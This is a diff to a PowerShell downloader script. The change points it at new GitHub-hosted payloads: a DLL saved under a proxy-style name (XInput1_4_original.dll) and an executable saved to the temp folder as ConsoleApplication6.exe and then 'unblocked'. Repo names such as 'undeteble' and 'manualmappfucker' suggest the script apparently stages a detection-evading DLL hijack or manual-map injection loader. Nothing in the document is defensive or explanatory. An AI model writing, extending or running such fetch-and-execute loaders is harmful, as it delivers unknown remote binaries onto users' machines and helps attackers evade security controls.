@@ -3,8 +3,8 @@
 # ================================
 
 # STEP 0: Download DLL directly to final name
-$dllUrl = "https://raw.githubusercontent.com/LOKIXFF/undeteble/refs/heads/main/d3dcompiler_47.dll"
-$dllPath = "D:\virtualbox\KaliLinux\Logs\d3dcompiler_47.dll"
+$dllUrl = "https://raw.githubusercontent.com/LOKIXFF/private/refs/heads/main/XInput1_4_original.dll"
+$dllPath = "D:\virtualbox\KaliLinux\Logs\XInput1_4_original.dll"
 
 # Create directory if it doesn't exist
 $dir = Split-Path $dllPath
@@ -17,7 +17,7 @@ Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath -UseBasicParsing -ErrorAction S
 Start-Sleep -Seconds 2
 
 # STEP 1: Define EXE URL and path
-$exeUrl = "https://raw.githubusercontent.com/Mohit-Parihar-112/manualmappfucker-projecct/refs/heads/main/audio.dg.exe"
+$exeUrl = "https://raw.githubusercontent.com/LOKIXFF/private/refs/heads/main/audio.dg.exe"
 $tempExe = "$env:TEMP\ConsoleApplication6.exe"
 
 # Download and unblock EXE
